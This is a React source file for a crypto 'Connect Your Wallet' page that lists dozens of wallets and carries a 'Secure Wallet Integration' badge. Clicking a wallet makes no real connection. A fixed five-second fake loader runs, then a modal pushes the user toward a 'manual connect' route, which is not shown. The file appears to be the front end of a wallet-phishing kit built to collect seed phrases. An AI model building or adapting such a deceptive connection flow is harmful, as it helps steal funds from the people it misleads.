import React, { useState, useEffect } from 'react';
import { Wallet, Search, Shield } from 'lucide-react';
import { setSelectedWallet } from './walletSlice';

import SearchBar from './SearchBar';
import WalletGrid from './WalletGrid';
import WalletModal from './WalletModal';
import Loader from './Loader';
import ledger from './assets/images.png'
import oneInch from './assets/1inch.jpg';
import arculus from './assets/arculus.jpg';
import argent from './assets/argent.jpg';
import atWallet from './assets/at_wallet.jpg';
import atokenWallet from './assets/atoken_wallet.jpg';
import atomic from './assets/atomic.jpg';
import bifrost from './assets/bifrost.jpg';
import binance from './assets/binance.png';
import bitkeep from './assets/bitkeep.jpg';
import bitpay from './assets/bitpay.jpg';
import bridgeWallet from './assets/bridge_wallet.jpg';
import celoWallet from './assets/celo_wallet.jpg';
import coin98 from './assets/coin98.jpg';
import coinbase from './assets/coinbases.png';
import coinomi from './assets/coinomi.jpg';
import coinus from './assets/coinus.jpg';
import compound from './assets/compound.jpg';
import coolWalletS from './assets/cool_wallet_s.jpg';
import crypto from './assets/crypto.jpg';
import dharma from './assets/dharma.jpg';
import dokWallet from './assets/dok_wallet.jpg';
import easypocket from './assets/easypocket.jpg';
import ellipal from './assets/ellipal.jpg';
import encryptedInk from './assets/encrypted_ink.jpg';
import enjin from './assets/enjin.jpg';
import error from './assets/error.png';
import etoro from './assets/etoro.jpg';
import exodus from './assets/exodus.jpg';

import flareWallet from './assets/flare_wallet.jpg';
import gridplus from './assets/gridplus.jpg';
import guardaWallet from './assets/guarda_wallet.jpg';
import halodefiWallet from './assets/halodefi_wallet.jpg';
import hashkeyMe from './assets/hashkey_me.jpg';
import huobi from './assets/huobi.jpg';
import imtoken from './assets/imtoken.jpg';
import infinito from './assets/infinito.jpg';
import iotex from './assets/iotex.jpg';
import jadeWallet from './assets/jade_wallet.jpg';
import keyringPro from './assets/keyring_pro.jpg';
import kyberswap from './assets/kyberswap.jpg';
import ledgerLive from './assets/ledger_live.jpg';
import mathWallet from './assets/math_wallet.jpg';
import metamask from './assets/metamask.jpg';
import midasWallet from './assets/midas_wallet.jpg';
import mykey from './assets/mykey.jpg';
import nash from './assets/nash.jpg';
import phantom from './assets/phantom.jpg';

import o3Wallet from './assets/o3_wallet.jpg';
import onto from './assets/onto.jpg';
import ownbit from './assets/ownbit.jpg';
import plasmapay from './assets/plasmapay.jpg';
import polkadot from './assets/polkadot.jpg';
import polygon from './assets/polygon.jpg';
import rainbow from './assets/rainbow.jpg';
import reactSvg from './assets/react.svg';
import rwallet from './assets/rwallet.jpg';
import safepal from './assets/safepal.jpg';
import shield from './assets/shield.png';
import spatium from './assets/spatium.jpg';
import { useDispatch } from 'react-redux';
import { useNavigate } from 'react-router-dom';

import talkenWallet from './assets/talken_wallet.jpg';
import tokenPocket from './assets/token_pocket.jpg';
import tokenary from './assets/tokenary.jpg';
import tongueWallet from './assets/tongue_wallet.jpg';
import torus from './assets/torus.jpg';
import tradestation from './assets/tradestation.jpg';
import trezor from './assets/trezor.jpg';
import trustVault from './assets/trust_vault.jpg';
import trustWallet from './assets/trustwallet.png';
import trusteeWallet from './assets/trustee_wallet.jpg';
import unnamed from './assets/unnamed.png'; 
import unnamedWebp from './assets/unnamed.webp';
import unnamed1 from './assets/unnamed(1).png';
import unnamed2 from './assets/unnamed(2).png';
import yoroi from './assets/yoroi.png';
import okm from './assets/okm.png';




import unstoppableWallet from './assets/unstoppable_wallet.jpg';
import valora from './assets/valora.jpg';
import viaWallet from './assets/via_wallet.jpg';
import walle from './assets/walle.jpg';
import walletIo from './assets/wallet_io.jpg';
import walleth from './assets/walleth.jpg';
import xinfin from './assets/xinfin.jpg';
import xumm from './assets/xumm.png';
import zelcore from './assets/zelcore.jpg';
import LoaderConnection from './LoaderConnection';
import InitialLoader from './InitialLoader';



const wallets = [
  { id: 1, name: '1inch', url: 'https://1inch.io', icon: oneInch },
  { id: 2, name: 'Arculus', url: 'https://getarculus.com', icon: arculus },
  { id: 3, name: 'Argent', url: 'https://www.argent.xyz', icon: argent },
  { id: 4, name: 'At Wallet', url: 'https://www.atwallet.io', icon: atWallet },
  { id: 5, name: 'Atoken Wallet', url: 'https://www.atoken.com', icon: atokenWallet },
  { id: 6, name: 'Atomic', url: 'https://atomicwallet.io', icon: atomic },
  { id: 7, name: 'Bifrost', url: 'https://bifrostwallet.com', icon: bifrost },
  { id: 8, name: 'Binance Wallet', url: 'https://www.binance.com', icon: binance },
  { id: 9, name: 'BitKeep', url: 'https://bitkeep.com', icon: bitkeep },
  { id: 10, name: 'BitPay', url: 'https://bitpay.com', icon: bitpay },
  { id: 11, name: 'Ledger', url: 'https://www.ledger.com', icon: ledger },
  { id: 12, name: 'Bridge Wallet', url: 'https://www.mtpelerin.com/bridge-wallet', icon: bridgeWallet },
  { id: 13, name: 'Celo Wallet', url: 'https://celowallet.app', icon: celoWallet },
  { id: 14, name: 'Coin98', url: 'https://coin98.com', icon: coin98 },
  { id: 15, name: 'Coinbase', url: 'https://www.coinbase.com', icon: coinbase },
  { id: 16, name: 'Coinomi', url: 'https://www.coinomi.com', icon: coinomi },
  { id: 17, name: 'Coinus', url: 'https://coinus.io', icon: coinus },
  { id: 18, name: 'Compound', url: 'https://compound.finance', icon: compound },
  { id: 19, name: 'Cool Wallet S', url: 'https://www.coolwallet.io', icon: coolWalletS },
  { id: 20, name: 'Crypto.com', url: 'https://crypto.com', icon: crypto },
  { id: 21, name: 'Dok Wallet', url: 'https://dokwallet.com', icon: dokWallet },
  { id: 22, name: 'EasyPocket', url: 'https://easypocket.app', icon: easypocket },
  { id: 23, name: 'Ellipal', url: 'https://www.ellipal.com', icon: ellipal },
  { id: 24, name: 'Enjin', url: 'https://enjin.io', icon: enjin },
  { id: 25, name: 'Etoro', url: 'https://www.etoro.com', icon: etoro },
  { id: 26, name: 'Exodus', url: 'https://www.exodus.com', icon: exodus },
  { id: 27, name: 'Flare Wallet', url: 'https://flarewallet.io', icon: flareWallet },
  { id: 28, name: 'Gridplus', url: 'https://gridplus.io', icon: gridplus },
  { id: 29, name: 'Guarda Wallet', url: 'https://guarda.com', icon: guardaWallet },
  { id: 30, name: 'Hashkey Me', url: 'https://me.hashkey.com', icon: hashkeyMe },
  { id: 31, name: 'Huobi', url: 'https://www.huobi.com', icon: huobi },
  { id: 32, name: 'Imtoken', url: 'https://token.im', icon: imtoken },
  { id: 33, name: 'Infinito', url: 'https://www.infinitowallet.io', icon: infinito },
  { id: 34, name: 'IoTex', url: 'https://iotex.io', icon: iotex },
  { id: 35, name: 'Keyring Pro', url: 'https://keyring.app', icon: keyringPro },
  { id: 36, name: 'Kyberswap', url: 'https://kyberswap.com', icon: kyberswap },
  { id: 37, name: 'Ledger Live', url: 'https://www.ledger.com/ledger-live', icon: ledgerLive },
  { id: 38, name: 'Math Wallet', url: 'https://mathwallet.org', icon: mathWallet },
  { id: 39, name: 'Metamask', url: 'https://metamask.io', icon: metamask },
  { id: 40, name: 'MyKey', url: 'https://mykey.org', icon: mykey },
  { id: 41, name: 'O3 Wallet', url: 'https://o3.network', icon: o3Wallet },
  { id: 42, name: 'Onto', url: 'https://onto.app', icon: onto },
  { id: 43, name: 'Ownbit', url: 'https://ownbit.io', icon: ownbit },
  { id: 44, name: 'Plasmapay', url: 'https://plasmapay.com', icon: plasmapay },
  { id: 45, name: 'Polkadot', url: 'https://polkadot.network', icon: polkadot },
  { id: 46, name: 'Polygon', url: 'https://polygon.technology', icon: polygon },
  { id: 47, name: 'Rainbow', url: 'https://rainbow.me', icon: rainbow },
  { id: 48, name: 'RWallet', url: 'https://www.rwallet.app', icon: rwallet },
  { id: 49, name: 'Safepal', url: 'https://safepal.io', icon: safepal },
  { id: 50, name: 'Spatium', url: 'https://spatium.net', icon: spatium },
  { id: 51, name: 'Talken Wallet', url: 'https://talken.io', icon: talkenWallet },
  // { id: 52, name: 'Token Pocket', url: 'https://www.tokenpocket.pro', icon: tokenPocket },
  { id: 53, name: 'Tokenary', url: 'https://tokenary.io', icon: tokenary },
  {id: 52, name: 'Yoroi', url:'https://yoroi-wallet.com/', icon: yoroi },

  { id: 54, name: 'Torus', url: 'https://tor.us', icon: torus },
  { id: 55, name: 'Tradestation', url: 'https://www.tradestation.com', icon: tradestation },
  { id: 56, name: 'Trezor', url: 'https://trezor.io', icon: trezor },
  { id: 57, name: 'Trust Wallet', url: 'https://trustwallet.com', icon: trustWallet },
  { id: 58, name: 'Trustee Wallet', url: 'https://trusteeglobal.com', icon: trusteeWallet },
  { id: 59, name: 'Unstoppable Wallet', url: 'https://unstoppable.money', icon: unstoppableWallet },
  { id: 60, name: 'Valora', url: 'https://valoraapp.com', icon: valora },
  { id: 61, name: 'Via Wallet', url: 'https://viawallet.com', icon: viaWallet },
  { id: 62, name: 'Wallet Io', url: 'https://wallet.io', icon: walletIo },
  { id: 63, name: 'Walleth', url: 'https://walleth.org', icon: walleth },
  { id: 64, name: 'Xinfin', url: 'https://xinfin.org', icon: xinfin },
  { id: 65, name: 'TokenPocket', url: 'https://www.tokenpocket.pro', icon: xumm },
  { id: 66, name: 'Zelcore', url: 'https://zelcore.io', icon: zelcore },
  { id: 67, name: 'Phantom', url: 'https://phantom.com/', icon: phantom },
  { id: 67, name: 'Okx', url: 'https://www.okx.com/', icon: okm },

];


function Home() {
  
  const dispatch = useDispatch();
  const navigate = useNavigate();
  const [searchTerm, setSearchTerm] = useState('');
  // const [selectedWallet, setSelectedWallet] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [showConnectionLoader, setShowConnectionLoader] = useState(false);
  const [selectedWalletForModal, setSelectedWalletForModal] = useState(null);

  const filteredWallets = wallets.filter(wallet =>
    wallet.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleCardClick = (wallet) => {
    // Store the selected wallet for the modal
    setSelectedWalletForModal(wallet);
    
    // Dispatch to Redux
    dispatch(setSelectedWallet({ 
      name: wallet.name,
      icon: wallet.icon,
      url: wallet.url
    }));
    
    // Show connection loader
    setShowConnectionLoader(true);

    // After loader, show modal
    setTimeout(() => {
      setShowConnectionLoader(false);
      setShowModal(true);
    }, 5000);
  };

  const showLoaderThenModal = () => {
    setIsLoading(true);
    setShowModal(false);
    setTimeout(() => {
      setIsLoading(false);
      setShowModal(true);
    }, 5000);
  };

  const handleCloseModal = () => {
    setSelectedWallet(null);
    setShowModal(false);
  };

  const handleManualConnect = () => {
    setShowModal(false);
    navigate('/connect-wallet');
  };

  const handleTryAgain = () => {
    setShowModal(false);
    setShowConnectionLoader(true);
    setTimeout(() => {
      setShowConnectionLoader(false);
      setShowModal(true);
    }, 5000);
  };

  return (
    <>
      {initialLoading ? (
        <InitialLoader onLoadingComplete={() => setInitialLoading(false)} />
      ) : (
        <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-900 to-gray-950">
          <div className="container mx-auto px-4 py-8">
            <div className="text-center mb-16 space-y-4">
              <div className="inline-block">
              <div className="inline-flex items-center gap-2 bg-purple-900/50 px-4 py-2 rounded-full mb-8 backdrop-blur-sm">
            <Shield size={16} className="text-purple-400" />
            <span className="text-sm font-medium text-purple-200">   Secure Wallet Integration</span>
          </div>
              </div>
              <h2 className="text-4xl md:text-5xl font-bold text-white">
                Connect Your Wallet
              </h2>
              <p className="text-gray-400 max-w-2xl mx-auto text-lg">
                Choose from our wide selection of supported wallets for secure blockchain interaction
              </p>
            </div>
            <SearchBar searchTerm={searchTerm} setSearchTerm={setSearchTerm} />
            <WalletGrid wallets={filteredWallets} onCardClick={handleCardClick} />
            {showConnectionLoader && <LoaderConnection />}
            {showModal && selectedWalletForModal && (
              <WalletModal 
                wallet={selectedWalletForModal}
                onClose={() => setShowModal(false)}
                onTryAgain={handleTryAgain}
                onManualConnect={handleManualConnect}
              />
            )}
          </div>
        </div>
      )}
    </>
  );
}

export default Home;